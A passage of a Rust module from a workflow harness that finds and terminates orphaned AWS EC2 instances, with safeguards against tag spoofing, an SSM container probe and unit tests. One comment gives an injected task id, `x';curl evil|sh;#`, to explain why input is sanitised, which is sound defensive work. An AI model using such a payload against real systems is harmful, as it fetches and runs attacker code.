//! Modularity split. The orphan-reap path lives here so
//! `aws/mod.rs` stays under the modularity cap. Pure code movement from
//! the original `mod.rs`; no behavior change.
//!
//! Cohesive unit: `scan_orphans` / `scan_orphans_verified` /
//! `describe_instance_state` / `scan_orphan_candidates` plus the
//! `OrphanReapSummary` shape they return. They share three things:
//! - the `BuiltBy=scripps-workflow-harness` tag filter shape,
//! - the `SWFC_AWS_ORPHAN_POLICY` env-var dispatch (`warn` / `dry-run`
//!   / `reap` / `none`),
//! - the `ScrippsWorkflowHarnessSessionId` tag-namespacing so a
//!   session-A reap never touches session-B's instance.
//!
//! `wait_for_ssm` lives here too because its only caller pattern is
//! "post-provision liveness check" against an instance the orphan code
//! also pokes via `describe_instance_state` — they share the
//! describe-instance polling cadence.

use super::{AwsExecutor, OrphanReapSummary};
use anyhow::{anyhow, Context, Result};
use scripps_workflow_core::container_state::{ContainerProbeOutcome, ContainerState};
use serde::Deserialize;
use std::collections::BTreeSet;
use std::time::{Duration, Instant};

/// P1-158 — AWS hard limit on `terminate-instances --instance-ids`
/// is 1000 ids per call. The reaper batches into chunks of this size
/// so a long-tail of orphan sessions still fits in one batched call
/// per chunk instead of 1000 single-id round-trips.
const TERMINATE_INSTANCES_BATCH_MAX: usize = 1000;

/// (succeeded_ids, failed_id_reason_pairs) — partition returned by
/// `parse_terminate_response` for one terminate-instances chunk.
type TerminatePartition = (Vec<String>, Vec<(String, String)>);

/// P1-158 — pure parser for `aws ec2 terminate-instances --output json`.
/// Extracted as a free function so the batch helper's response
/// classification can be unit-tested without spinning up an
/// `AwsExecutor` or shelling out to the AWS CLI.
///
/// Returns `Ok((succeeded, failed))` partitioning `chunk` based on
/// whether the response's `UnsuccessfulItems` claims the id; ids
/// absent from `UnsuccessfulItems` are treated as accepted. Returns
/// `Err(reason)` when the response isn't parseable JSON — caller
/// then marks the whole chunk failed.
pub(super) fn parse_terminate_response(
    stdout: &str,
    chunk: &[String],
) -> std::result::Result<TerminatePartition, String> {
    let v: serde_json::Value =
        serde_json::from_str(stdout).map_err(|e| format!("response parse error: {e}"))?;
    let mut chunk_failed: std::collections::BTreeMap<String, String> = Default::default();
    if let Some(items) = v["UnsuccessfulItems"].as_array() {
        for item in items {
            let id = item["ResourceId"]
                .as_str()
                .or_else(|| item["InstanceId"].as_str())
                .unwrap_or("")
                .to_string();
            if id.is_empty() {
                continue;
            }
            let reason = item["Error"]["Message"]
                .as_str()
                .or_else(|| item["Error"]["Code"].as_str())
                .unwrap_or("Unspecified UnsuccessfulItem")
                .to_string();
            chunk_failed.insert(id, reason);
        }
    }
    let mut succeeded = Vec::new();
    let mut failed = Vec::new();
    for id in chunk {
        match chunk_failed.remove(id) {
            Some(reason) => failed.push((id.clone(), reason)),
            None => succeeded.push(id.clone()),
        }
    }
    Ok((succeeded, failed))
}

/// One row of the EC2 describe-instances response shape we ask for
/// (`{Id, Tags}`). `Tags` is a list of `{Key, Value}` pairs; null when
/// the instance has no tags at all (rare but legal).
#[derive(Debug, Deserialize)]
struct InstanceRow {
    #[serde(rename = "Id")]
    id: String,
    #[serde(rename = "Tags", default)]
    tags: Option<Vec<InstanceTag>>,
}

#[derive(Debug, Deserialize)]
struct InstanceTag {
    #[serde(rename = "Key")]
    key: String,
    #[serde(rename = "Value")]
    value: String,
}

impl InstanceRow {
    fn session_id_tag(&self) -> Option<String> {
        self.tags
            .as_ref()?
            .iter()
            .find(|t| t.key == "ScrippsWorkflowHarnessSessionId")
            .map(|t| t.value.clone())
    }
}

/// W4.3: classify the container runtime from the `live` token shape.
///
/// Apptainer instance names embed the task id (long, contains
/// `_`/`-`/letters); docker container IDs are 12-hex (short form) or
/// 64-hex (long form). Cheap heuristic: short hex-only string ⇒ docker;
/// anything else ⇒ apptainer. The matching SLURM-side helper in
/// `slurm/polling.rs::classify_slurm_probe_envelope` uses the same
/// shape — keep them in sync if the heuristic evolves.
pub(crate) fn classify_runtime_from_container_id(live: &str) -> &'static str {
    let hex_only = live.chars().all(|c| c.is_ascii_hexdigit());
    if hex_only && (live.len() <= 12 || live.len() == 64) {
        "docker"
    } else {
        "apptainer"
    }
}

/// Parse the `{"live": "<container_id>", "sidecar": <state | null>}`
/// envelope the SSM probe script (and the SLURM `cat` script) emits.
/// Lifted to module scope so the SLURM polling counterpart can reuse
/// the same parser without going through SSM.
pub(crate) fn classify_probe_envelope(body: &str) -> ContainerProbeOutcome {
    let trimmed = body.trim();
    if trimmed.is_empty() {
        return ContainerProbeOutcome::NoSignal;
    }
    let v: serde_json::Value = match serde_json::from_str(trimmed) {
        Ok(v) => v,
        Err(e) => {
            return ContainerProbeOutcome::ProbeFailed {
                reason: format!("envelope parse: {e}"),
            };
        }
    };
    let live = v.get("live").and_then(|x| x.as_str()).unwrap_or("");
    if !live.is_empty() {
        return ContainerProbeOutcome::ContainerAlive {
            container_id: live.to_string(),
            runtime: classify_runtime_from_container_id(live).to_string(),
        };
    }
    let sidecar = v.get("sidecar");
    match sidecar {
        Some(s) if !s.is_null() => match serde_json::from_value::<ContainerState>(s.clone()) {
            Ok(state) if !state.task_id.is_empty() => {
                ContainerProbeOutcome::ContainerExited { state }
            }
            Ok(_) => ContainerProbeOutcome::ProbeFailed {
                reason: "sidecar missing task_id".into(),
            },
            Err(e) => ContainerProbeOutcome::ProbeFailed {
                reason: format!("sidecar parse: {e}"),
            },
        },
        _ => ContainerProbeOutcome::NoSignal,
    }
}

/// Defense-in-depth: cross-check orphan candidates against a known set of
/// instance_ids this harness actually launched (sourced from WORKFLOW.json).
///
/// Returns `(kept, filtered)`. Each entry in `filtered` was present in
/// `candidates` but absent from `wal_ids` — i.e. it has the right tags but
/// no record of ever having been launched by this harness, which indicates a
/// likely tag spoof. The caller is expected to log a `tracing::warn!` for
/// each filtered id and discard them.
///
/// When `wal_ids` is empty (fresh package, no Running AWS tasks recorded in
/// WORKFLOW.json yet, or WORKFLOW.json unavailable) the function keeps ALL
/// candidates so the reaper degrades gracefully to tag-only filtering rather
/// than silently dropping legitimate orphans.
pub(super) fn wal_cross_check(
    candidates: &[String],
    wal_ids: &BTreeSet<String>,
) -> (Vec<String>, Vec<String>) {
    if wal_ids.is_empty() {
        return (candidates.to_vec(), Vec::new());
    }
    let mut kept = Vec::new();
    let mut filtered = Vec::new();
    for id in candidates {
        if wal_ids.contains(id) {
            kept.push(id.clone());
        } else {
            filtered.push(id.clone());
        }
    }
    (kept, filtered)
}

impl AwsExecutor {
    /// List every EC2 instance the harness might have provisioned
    /// (BuiltBy tag). Per `SWFC_AWS_ORPHAN_POLICY`, either log them
    /// (`warn`) or terminate them (`reap`) or list-only (`dry-run`).
    /// Returns the list of orphan instance ids found so callers can
    /// include them in a status message.
    ///
    /// since this does not verify post-termination
    /// state, prefer [`Self::scan_orphans_verified`] for reap sweeps
    /// that want a confirmed `terminated` state before declaring
    /// success.
    pub fn scan_orphans(&self) -> Result<Vec<String>> {
        // Include tags in the query so we can
        // exclude instances owned by live peer harnesses (sessions
        // currently holding a `~/.scripps-workflow/locks/*.lock`).
        // The legacy InstanceId-only query is preserved as the fallback
        // shape; callers that don't care about peer protection get the
        // same set as before because `live_peer_sessions` returns
        // empty when no peer is running.
        let stdout = self.run_aws(&[
            "ec2",
            "describe-instances",
            "--filters",
            "Name=tag:BuiltBy,Values=scripps-workflow-harness",
            "Name=instance-state-name,Values=running,pending",
            "--query",
            "Reservations[].Instances[].{Id:InstanceId,Tags:Tags}",
            "--output",
            "json",
        ])?;
        let rows: Vec<InstanceRow> = serde_json::from_str(&stdout)
            .with_context(|| format!("parsing describe-instances output: {}", stdout))?;
        let live = self
            .instance
            .as_ref()
            .map(|i| i.instance_id.as_str())
            .unwrap_or("");
        let peers = super::super::super::multiprocess_lock::live_peer_sessions(
            self.config.harness_session_id.as_deref(),
        );
        let orphans: Vec<String> = rows
            .into_iter()
            .filter(|row| row.id != live)
            .filter(|row| match row.session_id_tag() {
                Some(s) => !peers.contains(&s),
                None => true,
            })
            .map(|row| row.id)
            .collect();
        let mode = std::env::var("SWFC_AWS_ORPHAN_POLICY").unwrap_or_else(|_| "warn".into());
        if !orphans.is_empty() && mode.trim().eq_ignore_ascii_case("reap") {
            // P1-158 — one batched API call (chunked by AWS's 1000-id
            // limit) instead of one per-id round-trip. Failures are
            // logged here because the legacy `scan_orphans` signature
            // returns only the candidate list; callers that want per-id
            // outcomes should use `scan_orphans_verified` which carries
            // them through to `OrphanReapSummary`.
            let (_succeeded, failed) = self.batch_terminate_instances(&orphans);
            for (id, reason) in &failed {
                tracing::warn!(
                    target: "swfc::aws::orphans",
                    instance_id = %id,
                    reason = %reason,
                    "terminate-instances failed for orphan id"
                );
            }
        }
        Ok(orphans)
    }

    /// Verified orphan reap. Same candidate scan as
    /// [`Self::scan_orphans`], but after issuing `terminate-instances`
    /// this polls `describe-instances` every 10s up to 5 minutes
    /// (configurable via `SWFC_AWS_ORPHAN_VERIFY_TIMEOUT_SECS`) and
    /// records which ids converged to `terminated` / `shutting-down`.
    /// Returns a summary that callers forward as an
    /// `orphan_instances_reaped` progress event so the Progress tab
    /// surfaces a chip with the verified vs unverified counts.
    ///
    /// Policy dispatch: `dry-run` skips termination and verification,
    /// returning just the candidate list; `reap` terminates + polls;
    /// `warn` (default) returns candidates without acting; `none`
    /// does nothing. Session-id namespacing via the
    /// `ScrippsWorkflowHarnessSessionId` tag prevents cross-session
    /// reaps — candidates without a matching tag are skipped.
    ///
    /// Defense-in-depth — WAL cross-check (tag-spoof guard):
    ///
    /// Tag-based filtering alone is insufficient: an attacker or
    /// misconfigured tool could write both `BuiltBy=scripps-workflow-harness`
    /// and `ScrippsWorkflowHarnessSessionId=<sid>` onto an unrelated
    /// instance, causing the reaper to terminate it. The WAL cross-check
    /// adds a second layer: only instances whose instance_id appears in
    /// THIS harness's WORKFLOW.json (i.e. instances we actually launched
    /// and track in Running state) are eligible. Any tag-matching
    /// candidate absent from the WAL set is logged as a likely spoof and
    /// dropped before any termination call. When the WAL set is empty
    /// (fresh run, no AWS tasks dispatched yet) the guard degrades
    /// gracefully to tag-only filtering so the reaper still operates.
    pub fn scan_orphans_verified(&self, session_id_tag: Option<&str>) -> Result<OrphanReapSummary> {
        let mode = std::env::var("SWFC_AWS_ORPHAN_POLICY").unwrap_or_else(|_| "warn".into());
        if mode.trim().eq_ignore_ascii_case("none") {
            return Ok(OrphanReapSummary::default_with_policy(&mode));
        }
        let mut candidates = self.scan_orphan_candidates(session_id_tag)?;
        candidates.sort();
        candidates.dedup();
        // WAL cross-check: filter out any candidate not found in
        // WORKFLOW.json's Running tasks — those lack a record of ever
        // having been launched by this harness and are likely tag spoofs.
        let wal_ids = super::super::super::dispatch_wal::instance_ids_from_workflow_json(
            std::path::Path::new(&self.args.package),
        );
        let (candidates, spoofed) = wal_cross_check(&candidates, &wal_ids);
        for id in &spoofed {
            tracing::warn!(
                target: "swfc::aws::orphans",
                instance_id = %id,
                "orphan candidate {id} has matching tags but not in this harness's WAL — skipping (possible tag spoof)"
            );
        }
        let policy = mode.trim().to_lowercase();
        if candidates.is_empty() {
            return Ok(OrphanReapSummary {
                policy,
                ..Default::default()
            });
        }
        // warn / dry-run never issue terminate-instances.
        if policy == "warn" || policy == "dry-run" {
            return Ok(OrphanReapSummary {
                policy,
                candidate_count: candidates.len() as u64,
                unverified_ids: candidates,
                ..Default::default()
            });
        }
        // P1-158 — reap: one batched API call per chunk of up to 1000
        // ids instead of one round-trip per id. Failures (API-side)
        // are captured separately from convergence failures.
        let (_succeeded, terminate_failures) = self.batch_terminate_instances(&candidates);
        // Skip the convergence poll for ids the API itself refused —
        // they will never converge. Poll only over the accepted set.
        let failed_set: std::collections::BTreeSet<&str> = terminate_failures
            .iter()
            .map(|(id, _)| id.as_str())
            .collect();
        let timeout_secs: u64 = std::env::var("SWFC_AWS_ORPHAN_VERIFY_TIMEOUT_SECS")
            .ok()
            .and_then(|s| s.parse().ok())
            .unwrap_or(300);
        let deadline = Instant::now() + std::time::Duration::from_secs(timeout_secs);
        let mut verified: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();
        let pollable_count = candidates.len() - failed_set.len();
        while Instant::now() < deadline && verified.len() < pollable_count {
            for id in &candidates {
                if verified.contains(id) || failed_set.contains(id.as_str()) {
                    continue;
                }
                let state = self.describe_instance_state(id).unwrap_or_default();
                if state == "terminated" || state == "shutting-down" {
                    verified.insert(id.clone());
                }
            }
            if verified.len() < pollable_count {
                std::thread::sleep(std::time::Duration::from_secs(10));
            }
        }
        let unverified: Vec<String> = candidates
            .iter()
            .filter(|id| !verified.contains(id.as_str()) && !failed_set.contains(id.as_str()))
            .cloned()
            .collect();
        let verified_ids: Vec<String> = verified.iter().cloned().collect();
        Ok(OrphanReapSummary {
            policy,
            candidate_count: candidates.len() as u64,
            verified_count: verified.len() as u64,
            unverified_ids: unverified,
            verified_ids,
            terminate_failures,
        })
    }

    /// Helper — run `describe-instances --instance-ids <id>` and pull
    /// `.Reservations[].Instances[].State.Name`. Returns "" on any
    /// failure so the polling loop treats it as not-yet-terminated.
    pub(super) fn describe_instance_state(&self, instance_id: &str) -> Result<String> {
        let stdout = self.run_aws(&[
            "ec2",
            "describe-instances",
            "--instance-ids",
            instance_id,
            "--query",
            "Reservations[].Instances[].State.Name",
            "--output",
            "json",
        ])?;
        let states: Vec<String> = serde_json::from_str(&stdout).unwrap_or_default();
        Ok(states.into_iter().next().unwrap_or_default())
    }

    /// Candidate scan respecting the session-id tag so session A's
    /// sweep never reaps session B's instance.
    ///
    /// Also excludes instances whose
    /// `ScrippsWorkflowHarnessSessionId` tag matches a live peer
    /// harness (per `multiprocess_lock::live_peer_sessions`). Without
    /// this, a global / session-untagged orphan sweep (operator-run
    /// `scan_orphans_verified(None)`) would reap instances belonging
    /// to a server-spawned peer harness for a different session.
    pub(super) fn scan_orphan_candidates(
        &self,
        session_id_tag: Option<&str>,
    ) -> Result<Vec<String>> {
        let mut filters: Vec<String> = vec![
            "Name=tag:BuiltBy,Values=scripps-workflow-harness".into(),
            "Name=instance-state-name,Values=running,pending".into(),
        ];
        if let Some(sid) = session_id_tag {
            filters.push(format!(
                "Name=tag:ScrippsWorkflowHarnessSessionId,Values={}",
                sid
            ));
        }
        let mut args: Vec<&str> = vec!["ec2", "describe-instances", "--filters"];
        for f in &filters {
            args.push(f);
        }
        // Pull the session-id tag alongside the instance id so we can
        // filter peer-owned instances client-side without a second
        // round-trip per candidate.
        args.extend_from_slice(&[
            "--query",
            "Reservations[].Instances[].{Id:InstanceId,Tags:Tags}",
            "--output",
            "json",
        ]);
        let stdout = self.run_aws(&args)?;
        let rows: Vec<InstanceRow> = serde_json::from_str(&stdout)
            .with_context(|| format!("parsing describe-instances output: {}", stdout))?;
        let live = self
            .instance
            .as_ref()
            .map(|i| i.instance_id.as_str())
            .unwrap_or("");
        // Resolve the set of live peer harness session ids. Empty when
        // no other harness holds a `~/.scripps-workflow/locks/*.lock`.
        let peers = super::super::super::multiprocess_lock::live_peer_sessions(session_id_tag);
        Ok(rows
            .into_iter()
            .filter(|row| row.id != live)
            .filter(|row| {
                let row_sid = row.session_id_tag();
                match row_sid {
                    Some(s) => !peers.contains(&s),
                    // No session tag = legacy instance; can't tell who
                    // owns it, default to candidate so the existing
                    // sweep semantics aren't loosened.
                    None => true,
                }
            })
            .map(|row| row.id)
            .collect())
    }

    /// P1-158 — batch `terminate-instances` across many ids. Splits
    /// `ids` into chunks of `TERMINATE_INSTANCES_BATCH_MAX` (AWS's
    /// per-call limit) and issues one API call per chunk instead of
    /// one per id.
    ///
    /// Returns `(succeeded, failed)` where `succeeded` lists ids AWS
    /// accepted (now in `shutting-down` or `terminated`) and `failed`
    /// pairs ids with the failure reason AWS provided in the
    /// `UnsuccessfulItems` array. Partial chunk failure does not
    /// abort the sweep — the next chunk still fires so a single bad
    /// instance id can't strand 999 sibling orphans.
    ///
    /// Caller-shell out, no retries: the orphan-reap path is
    /// idempotent (the candidate scan re-runs each harness start)
    /// so a transient failure on this call surfaces on the next
    /// startup. Tight retry loops inside the sweep would slow the
    /// harness-launch path on a wide outage; the daemon's natural
    /// cadence is the right backoff.
    pub(super) fn batch_terminate_instances(
        &self,
        ids: &[String],
    ) -> (Vec<String>, Vec<(String, String)>) {
        let mut succeeded: Vec<String> = Vec::new();
        let mut failed: Vec<(String, String)> = Vec::new();
        if ids.is_empty() {
            return (succeeded, failed);
        }
        for chunk in ids.chunks(TERMINATE_INSTANCES_BATCH_MAX) {
            // Build the arg vector once per chunk. `terminate-instances`
            // accepts multiple ids after a single `--instance-ids` flag.
            let mut args: Vec<&str> = vec!["ec2", "terminate-instances", "--instance-ids"];
            for id in chunk {
                args.push(id.as_str());
            }
            args.extend_from_slice(&["--output", "json"]);
            let stdout = match self.run_aws(&args) {
                Ok(s) => s,
                Err(e) => {
                    // Whole chunk failed (network error, IAM denial).
                    // Surface every id in the chunk as failed so the
                    // operator sees the universe of impacted ids.
                    let reason = format!("batch call error: {e}");
                    for id in chunk {
                        failed.push((id.clone(), reason.clone()));
                    }
                    continue;
                }
            };
            match parse_terminate_response(&stdout, chunk) {
                Ok((chunk_succeeded, chunk_failed)) => {
                    succeeded.extend(chunk_succeeded);
                    failed.extend(chunk_failed);
                }
                Err(reason) => {
                    for id in chunk {
                        failed.push((id.clone(), reason.clone()));
                    }
                }
            }
        }
        (succeeded, failed)
    }

    /// Container-aware orphan probe via SSM RunShellScript.
    ///
    /// Issue a single `aws ssm send-command` against `instance_id` running:
    ///
    /// 1. `docker ps --filter label=swfc-task=<task_id> --format '{{.ID}}|{{.Image}}'`
    ///    — first row identifies a still-alive container the reaper can
    ///    target without touching the host. Empty stdout = no live row.
    /// 2. `cat /home/<user>/scripps-workflow/<package>/runtime/outputs/<task_id>/.container-state.json`
    ///    — best-effort follow-up. Present only after the container exited;
    ///    lets the reaper distinguish "container hung" from "container
    ///    exited cleanly". Path passed by the caller because the package
    ///    install root is harness-side configuration, not orphans-side.
    ///
    /// Returns:
    /// - `ContainerAlive { container_id, runtime: "docker" }` when probe (1) returns a row
    /// - `ContainerExited { state }` when the sidecar parses
    /// - `NoSignal` when neither signal materialises (legacy host-mode or pre-S15.22 task)
    /// - `ProbeFailed { reason }` if SSM transport fails entirely
    ///
    /// Wrapped in a 60s deadline; SSM list-command-invocations polls at 5s.
    ///
    /// Naming: this is the SSM-driven helper consumed by the
    /// `Executor::probe_container_state` trait method on
    /// `impl Executor for AwsExecutor`. The trait method delegates here
    /// so the inherent and trait names don't collide.
    pub fn do_probe_container_state(
        &self,
        task_id: &str,
        package_dir: &std::path::Path,
    ) -> ContainerProbeOutcome {
        let Some(inst) = self.instance.as_ref() else {
            return ContainerProbeOutcome::ProbeFailed {
                reason: "probe_container_state called before provision".into(),
            };
        };
        // `task_id` and `package_dir` are interpolated directly into
        // the SSM bash script below. Without validation a hostile task
        // id like `x';curl evil|sh;#` runs as a literal shell
        // statement on the EC2 instance under SSM's privileges.
        // Mirrors the defense in slurm/polling.rs.
        if let Err(reason) = super::super::_id_validator::sanitize_task_id(task_id) {
            return ContainerProbeOutcome::ProbeFailed { reason };
        }
        let pkg_str = package_dir.to_string_lossy();
        if !super::super::_id_validator::package_dir_is_safe(&pkg_str) {
            return ContainerProbeOutcome::ProbeFailed {
                reason: format!("unsafe package_dir for SSM interpolation: {pkg_str:?}"),
            };
        }
        let pkg = package_dir.display();
        // The shell composition: emit a JSON envelope with two tagged
        // sections so a single SSM call does both the live-container
        // probe and the sidecar read. The reaper parses the envelope
        // and drops to NoSignal on any partial/missing payload.
        let script = format!(
            "set -u\
             ; LIVE=\"\"; if command -v docker >/dev/null 2>&1; then \
               LIVE=$(docker ps --filter label=swfc-task={task_id} --format '{{{{.ID}}}}' 2>/dev/null | head -1); \
             fi\
             ; SIDECAR=\"\"; SIDECAR_PATH={pkg}/runtime/outputs/{task_id}/.container-state.json\
             ; if [ -f \"$SIDECAR_PATH\" ]; then SIDECAR=$(cat \"$SIDECAR_PATH\" 2>/dev/null); fi\
             ; printf '{{\"live\":\"%s\",\"sidecar\":%s}}' \"$LIVE\" \"$(if [ -z \"$SIDECAR\" ]; then echo null; else echo \"$SIDECAR\"; fi)\""
        );
        let parameters = format!("{{\"commands\":[{}]}}", serde_json::Value::String(script));
        let send_stdout = match self.run_aws(&[
            "ssm",
            "send-command",
            "--document-name",
            "AWS-RunShellScript",
            "--instance-ids",
            &inst.instance_id,
            "--parameters",
            &parameters,
            "--timeout-seconds",
            "60",
            "--comment",
            &format!("scripps-probe-{}", task_id),
            "--output",
            "json",
        ]) {
            Ok(s) => s,
            Err(e) => {
                return ContainerProbeOutcome::ProbeFailed {
                    reason: format!("send-command: {e}"),
                };
            }
        };
        let send_json: serde_json::Value = match serde_json::from_str(&send_stdout) {
            Ok(v) => v,
            Err(e) => {
                return ContainerProbeOutcome::ProbeFailed {
                    reason: format!("send-command parse: {e}"),
                };
            }
        };
        let Some(command_id) = send_json["Command"]["CommandId"].as_str() else {
            return ContainerProbeOutcome::ProbeFailed {
                reason: "send-command missing CommandId".into(),
            };
        };
        let deadline = Instant::now() + Duration::from_secs(60);
        let interval = Duration::from_secs(5);
        loop {
            let stdout = match self.run_aws(&[
                "ssm",
                "list-command-invocations",
                "--command-id",
                command_id,
                "--instance-id",
                &inst.instance_id,
                "--details",
                "--output",
                "json",
            ]) {
                Ok(s) => s,
                Err(e) => {
                    return ContainerProbeOutcome::ProbeFailed {
                        reason: format!("list-command-invocations: {e}"),
                    };
                }
            };
            let v: serde_json::Value = match serde_json::from_str(&stdout) {
                Ok(v) => v,
                Err(e) => {
                    return ContainerProbeOutcome::ProbeFailed {
                        reason: format!("list-command-invocations parse: {e}"),
                    };
                }
            };
            if let Some(inv) = v["CommandInvocations"].get(0) {
                let status = inv["Status"].as_str().unwrap_or("");
                match status {
                    "Success" => {
                        let body = inv["StandardOutputContent"].as_str().unwrap_or("");
                        return classify_probe_envelope(body);
                    }
                    "Failed" | "Cancelled" | "TimedOut" => {
                        return ContainerProbeOutcome::ProbeFailed {
                            reason: format!("ssm status={status}"),
                        };
                    }
                    _ => {}
                }
            }
            if Instant::now() >= deadline {
                return ContainerProbeOutcome::ProbeFailed {
                    reason: "probe deadline exceeded".into(),
                };
            }
            std::thread::sleep(interval);
        }
    }

    /// Poll `aws ssm describe-instance-information` until the
    /// provisioned instance shows up (PingStatus=Online), or until
    /// `timeout` elapses. Returns the raw stdout of the final call so
    /// tests can assert on the JSON shape.
    pub fn wait_for_ssm(&self, timeout: std::time::Duration) -> Result<String> {
        let inst = self
            .instance
            .as_ref()
            .ok_or_else(|| anyhow!("wait_for_ssm called before provision"))?;
        let deadline = Instant::now() + timeout;
        let interval = std::time::Duration::from_secs(5);
        loop {
            let stdout = self.run_aws(&[
                "ssm",
                "describe-instance-information",
                "--filters",
                &format!("Key=InstanceIds,Values={}", inst.instance_id),
                "--output",
                "json",
            ])?;
            let v: serde_json::Value = serde_json::from_str(&stdout)?;
            let online = v["InstanceInformationList"]
                .as_array()
                .map(|arr| {
                    arr.iter()
                        .any(|e| e["PingStatus"].as_str() == Some("Online"))
                })
                .unwrap_or(false);
            if online {
                return Ok(stdout);
            }
            if Instant::now() >= deadline {
                anyhow::bail!(
                    "instance {} did not appear in SSM within {:?}",
                    inst.instance_id,
                    timeout
                );
            }
            std::thread::sleep(interval);
        }
    }
}

#[cfg(test)]
mod probe_envelope_tests {
    use super::classify_probe_envelope;
    use scripps_workflow_core::container_state::ContainerProbeOutcome;

    #[test]
    fn empty_body_no_signal() {
        let outcome = classify_probe_envelope("");
        assert_eq!(outcome, ContainerProbeOutcome::NoSignal);
        let outcome = classify_probe_envelope("   \n");
        assert_eq!(outcome, ContainerProbeOutcome::NoSignal);
    }

    #[test]
    fn live_container_id_classifies_alive() {
        let body = r#"{"live":"abc123","sidecar":null}"#;
        match classify_probe_envelope(body) {
            ContainerProbeOutcome::ContainerAlive {
                container_id,
                runtime,
            } => {
                assert_eq!(container_id, "abc123");
                assert_eq!(runtime, "docker");
            }
            other => panic!("expected ContainerAlive, got {other:?}"),
        }
    }

    #[test]
    fn sidecar_only_classifies_exited() {
        let body = r#"{"live":"","sidecar":{"task_id":"qc","exit_code":0,"runtime":"docker"}}"#;
        match classify_probe_envelope(body) {
            ContainerProbeOutcome::ContainerExited { state } => {
                assert_eq!(state.task_id.as_str(), "qc");
                assert_eq!(state.exit_code, 0);
            }
            other => panic!("expected ContainerExited, got {other:?}"),
        }
    }

    #[test]
    fn neither_signal_returns_no_signal() {
        let body = r#"{"live":"","sidecar":null}"#;
        assert_eq!(
            classify_probe_envelope(body),
            ContainerProbeOutcome::NoSignal
        );
    }

    #[test]
    fn malformed_envelope_returns_probe_failed() {
        let body = "not json";
        match classify_probe_envelope(body) {
            ContainerProbeOutcome::ProbeFailed { reason } => {
                assert!(reason.contains("envelope parse"));
            }
            other => panic!("expected ProbeFailed, got {other:?}"),
        }
    }

    #[test]
    fn sidecar_missing_task_id_returns_probe_failed() {
        let body = r#"{"live":"","sidecar":{"exit_code":1}}"#;
        match classify_probe_envelope(body) {
            ContainerProbeOutcome::ProbeFailed { reason } => {
                assert!(reason.contains("task_id"));
            }
            other => panic!("expected ProbeFailed for missing task_id, got {other:?}"),
        }
    }

    #[test]
    fn live_takes_precedence_over_sidecar() {
        // If both signals are present (race window: container restarted
        // between the docker ps and the cat), the alive signal wins —
        // the reaper must not tear down a host whose container is
        // still doing work.
        let body = r#"{"live":"deadbeef","sidecar":{"task_id":"qc"}}"#;
        match classify_probe_envelope(body) {
            ContainerProbeOutcome::ContainerAlive { container_id, .. } => {
                assert_eq!(container_id, "deadbeef");
            }
            other => panic!("expected ContainerAlive, got {other:?}"),
        }
    }

    /// W4.3 — apptainer-tagged container ids (long, non-hex, embed the
    /// task id) must classify as `apptainer`, not silently as `docker`.
    /// Matches the SLURM-side heuristic in
    /// `slurm/polling.rs::classify_slurm_probe_envelope`.
    #[test]
    fn live_apptainer_instance_classifies_as_apptainer() {
        let body = r#"{"live":"swfc-task-bulk_rnaseq_de_sample_001","sidecar":null}"#;
        match classify_probe_envelope(body) {
            ContainerProbeOutcome::ContainerAlive {
                container_id,
                runtime,
            } => {
                assert_eq!(container_id, "swfc-task-bulk_rnaseq_de_sample_001");
                assert_eq!(runtime, "apptainer");
            }
            other => panic!("expected ContainerAlive(apptainer), got {other:?}"),
        }
    }

    /// W4.3 — docker 64-hex (long-form) container ids also classify as
    /// docker. Defends against future probe scripts that emit the full
    /// id instead of the truncated 12-hex variant.
    #[test]
    fn live_docker_64hex_classifies_as_docker() {
        let id = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let body = format!(r#"{{"live":"{id}","sidecar":null}}"#);
        match classify_probe_envelope(&body) {
            ContainerProbeOutcome::ContainerAlive { runtime, .. } => {
                assert_eq!(runtime, "docker");
            }
            other => panic!("expected ContainerAlive(docker), got {other:?}"),
        }
    }
}

#[cfg(test)]
mod batch_terminate_tests {
    use super::parse_terminate_response;

    #[test]
    fn all_accepted_when_no_unsuccessful_items() {
        let stdout = r#"{"TerminatingInstances":[{"InstanceId":"i-a","CurrentState":{"Name":"shutting-down"}},{"InstanceId":"i-b","CurrentState":{"Name":"shutting-down"}}]}"#;
        let chunk = vec!["i-a".to_string(), "i-b".to_string()];
        let (ok, fail) = parse_terminate_response(stdout, &chunk).unwrap();
        assert_eq!(ok, vec!["i-a".to_string(), "i-b".to_string()]);
        assert!(fail.is_empty());
    }

    #[test]
    fn partial_failure_split_correctly() {
        let stdout = r#"{
            "TerminatingInstances":[{"InstanceId":"i-a","CurrentState":{"Name":"shutting-down"}}],
            "UnsuccessfulItems":[{
                "ResourceId":"i-b",
                "Error":{"Code":"InvalidInstanceID.NotFound","Message":"instance i-b does not exist"}
            }]
        }"#;
        let chunk = vec!["i-a".to_string(), "i-b".to_string()];
        let (ok, fail) = parse_terminate_response(stdout, &chunk).unwrap();
        assert_eq!(ok, vec!["i-a".to_string()]);
        assert_eq!(fail.len(), 1);
        assert_eq!(fail[0].0, "i-b");
        assert!(fail[0].1.contains("does not exist"));
    }

    #[test]
    fn empty_chunk_returns_empty_pair() {
        let stdout = r#"{}"#;
        let chunk: Vec<String> = vec![];
        let (ok, fail) = parse_terminate_response(stdout, &chunk).unwrap();
        assert!(ok.is_empty());
        assert!(fail.is_empty());
    }

    #[test]
    fn malformed_json_returns_err() {
        let chunk = vec!["i-x".to_string()];
        let result = parse_terminate_response("not-json", &chunk);
        assert!(result.is_err());
        assert!(result.unwrap_err().contains("parse error"));
    }

    #[test]
    fn unsuccessful_without_id_is_ignored() {
        // AWS sometimes returns an UnsuccessfulItems entry with the
        // resource id missing entirely (rare; mostly a parser-robustness
        // check). The parser must not crash and must not falsely
        // mark every chunk id as failed.
        let stdout = r#"{
            "UnsuccessfulItems":[{"Error":{"Code":"NoIdProvided"}}]
        }"#;
        let chunk = vec!["i-a".to_string()];
        let (ok, fail) = parse_terminate_response(stdout, &chunk).unwrap();
        assert_eq!(ok, vec!["i-a".to_string()]);
        assert!(fail.is_empty());
    }
}

#[cfg(test)]
mod wal_cross_check_tests {
    use super::wal_cross_check;
    use std::collections::BTreeSet;

    /// Verify that `wal_cross_check` keeps the instance that appears in
    /// the WAL set and discards the tag-spoofed instance that does not.
    #[test]
    fn wal_cross_check_filters_tag_spoofed_instance() {
        // Two candidates: one this harness actually launched (i-real),
        // one whose tags were spoofed by an external actor (i-spoofed).
        let candidates = vec!["i-real".to_string(), "i-spoofed".to_string()];

        // WAL set contains only the instance this harness launched.
        let wal_ids: BTreeSet<String> = ["i-real"].iter().map(|s| s.to_string()).collect();

